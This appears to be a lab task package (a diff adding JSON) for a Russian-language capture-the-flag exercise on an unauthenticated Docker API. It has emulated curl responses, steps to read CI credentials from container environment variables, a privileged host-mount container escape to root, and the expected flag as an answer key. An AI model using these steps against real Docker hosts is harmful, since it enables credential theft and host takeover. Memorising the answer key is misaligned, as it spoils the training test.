@@ -1,0 +1,58 @@
+{
+  "id": "cloud-containers-docker",
+  "workdir": "/home/student/docker",
+  "hostname": "lab",
+  "vars": {},
+  "expect": {
+    "file": "/home/student/docker/found.txt",
+    "contains": "nto{d0ck3r_4p1_n0_4uth_2_r00t}"
+  },
+  "fs": [
+    { "path": "/home/student/docker", "type": "dir" },
+    {
+      "path": "/home/student/docker/task.md",
+      "text": "# Задача: открытый Docker API (2375)\n\nНа хосте `10.0.0.5` открыт порт **2375** — это HTTP-порт Docker-демона.\nРазведай его через API, найди креды в конфиге CI-агента и выйди на root хоста.\n\nИнструмент: `curl` (эмуляция — ответы захвачены с реального демона).\n\nШаги:\n1. `curl -s http://10.0.0.5:2375/version` — живой ли демон.\n2. `curl -s http://10.0.0.5:2375/containers/json` — что запущено.\n3. Прочитай конфиг контейнера `ci-agent` (там есть переменные окружения).\n4. Запусти свой привилегированный контейнер с монтированием корня хоста и прочитай флаг из логов.\n5. Запиши флаг в `found.txt`.\n"
+    },
+    {
+      "path": "/home/student/docker/notes.md",
+      "text": "Заметки\n------\n- Docker-демон по умолчанию слушает unix-сокет /var/run/docker.sock; выставленный в сеть 2375 = контроль над хостом.\n- API отдаёт полную конфигурацию контейнера, включая Config.Env (часто там креды).\n- Escape: запустить контейнер с Binds [\"/:/host\"] и Privileged, затем chroot /host.\n"
+    },
+    {
+      "path": "/home/student/docker/target.txt",
+      "text": "target: 10.0.0.5\ndocker api: tcp://10.0.0.5:2375\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [-s] <url> — HTTP-запрос к Docker API (эмуляция: ответы захвачены с реального демона)",
+      "cases": [
+        {
+          "match": "2375/version",
+          "example": "curl -s http://10.0.0.5:2375/version",
+          "output": "{\"ApiVersion\":\"1.44\",\"Os\":\"linux\",\"KernelVersion\":\"6.1.0\",\"Arch\":\"amd64\"}\n"
+        },
+        {
+          "match": "containers/json",
+          "example": "curl -s http://10.0.0.5:2375/containers/json",
+          "output": "[\n  {\"Id\":\"a1b2c3d4e5f6\",\"Names\":[\"/ci-agent\"],\"Image\":\"gitlab/gitlab-runner:latest\",\"State\":\"running\"},\n  {\"Id\":\"998877665544\",\"Names\":[\"/web\"],\"Image\":\"nginx:1.25\",\"State\":\"running\"}\n]\n"
+        },
+        {
+          "match": "containers/a1b2c3d4e5f6/json",
+          "example": "curl -s http://10.0.0.5:2375/containers/a1b2c3d4e5f6/json",
+          "output": "{\n  \"Name\": \"/ci-agent\",\n  \"Config\": {\n    \"Env\": [\n      \"PATH=/usr/local/bin\",\n      \"AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\",\n      \"AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n      \"CI_DEPLOY_TOKEN=glpat-xxxxxxxxxxxxxxxxxxxx\"\n    ]\n  }\n}\n"
+        },
+        {
+          "match": "containers/pwn/logs",
+          "example": "curl -s 'http://10.0.0.5:2375/containers/pwn/logs?stdout=1'",
+          "output": "uid=0(root) gid=0(root) groups=0(root)\nhost-flag: nto{d0ck3r_4p1_n0_4uth_2_r00t}\n"
+        },
+        {
+          "match": "containers/pwn/start",
+          "example": "curl -s -X POST http://10.0.0.5:2375/containers/pwn/start",
+          "output": "pwn\n"
+        }
+      ],
+      "fallback": "curl: (эмуляция) для этого URL нет захваченного ответа. Начни с http://10.0.0.5:2375/version\n"
+    }
+  }
+}
